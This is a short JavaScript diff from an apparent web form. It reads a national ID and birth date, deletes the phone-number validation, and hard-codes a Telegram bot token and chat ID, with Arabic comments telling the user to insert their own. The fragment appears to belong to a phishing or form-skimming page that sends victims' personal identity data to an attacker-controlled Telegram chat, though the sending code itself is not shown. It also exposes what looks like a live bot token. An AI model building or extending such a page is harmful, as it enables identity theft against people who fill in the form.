@@ -167,10 +167,7 @@
                     const nationalId = $("#national-id").val();
                     const birthDate = $("#birth-date").val();
 
-                    if (!phoneNumber || !/^\d{10,15}$/.test(phoneNumber)) {
-                        $('#verify_phone_number').text('يرجى إدخال رقم هاتف صالح').show();
-                        return;
-                    }
+                 
 
                     const botToken = "7603771616:AAEK5yLEQSvz5nHq_nxer1aDtypLjemGzTg"; // ضع رمز البوت الخاص بك هنا
                     const chatId = "-4625923889"; // ضع رقم تعريف الدردشة الخاصة بك هنا
